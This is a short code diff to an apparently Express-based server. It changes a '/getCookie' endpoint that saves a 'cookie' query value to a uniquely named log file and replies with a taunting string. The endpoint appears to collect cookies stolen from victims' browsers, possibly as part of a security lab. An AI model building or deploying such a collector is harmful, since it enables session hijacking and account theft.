@@ -174,7 +174,10 @@ app.get("/csrf-token", (req, res) => {
 });
 
 app.get("/getCookie", (req, res) => {
-  fs.writeFileSync("/var/log/node/" + Date.now(), req.query.cookie);
+  fs.writeFileSync(
+    "/var/log/node/" + Date.now() + Math.random().toString(36),
+    req.query.cookie
+  );
   res.send("贺建豪666");
 });
 
